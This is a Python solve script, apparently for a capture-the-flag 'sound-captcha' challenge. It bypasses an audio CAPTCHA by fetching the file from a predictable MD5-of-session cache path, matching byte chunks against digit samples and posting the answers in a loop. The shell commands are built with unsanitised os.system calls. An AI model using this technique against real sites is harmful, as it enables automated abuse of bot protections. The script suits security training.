#!/usr/bin/env python3

import requests
import hashlib
import os

#URL = "http://172.17.0.2/"
URL = "http://sound-captcha.sstf.site/"
PAGE = URL + "/index.php"
PHPSESSID = "DUMMYVALUE"
BASE_SIZE = 13259
enc = hashlib.md5()
enc.update(PHPSESSID.encode())
mp3_fname = enc.hexdigest() + ".mp3";

mp3_url = "{}/cache/{}".format(URL, mp3_fname)

print(mp3_url)

# os.system("wget --recursive --no-parent {}/mp3/hard/".format(URL))
def extract():
    os.system('wget -q {}'.format(mp3_url))
    os.system("split {} seg_ -b {}".format(mp3_fname, BASE_SIZE))

    captcha_val = ""
    for testee in ['seg_aa', 'seg_ab', 'seg_ac', 'seg_ad', 'seg_ae', 'seg_af']:
        for pool in range(0, 10):
            sample = "{}.mp3".format(pool)
            cmd = "diff {} {} 1>/dev/null 2>/dev/null".format(testee, sample)
            if os.system(cmd) == 0:
                captcha_val += str(pool)
                break
    print (captcha_val)
    os.system('rm {} 2>/dev/null'.format(mp3_fname))
    os.system("rm -f seg* 2>/dev/null")
    return captcha_val

def send(url, captcha_val):
    global PHPSESSID
    data = {'captcha_val': captcha_val}
    cookie = {'PHPSESSID': PHPSESSID}
    res = requests.post(url, data=data, cookies=cookie)
    return res.text
for i in range(0, 10):
    print (send(PAGE, extract()))
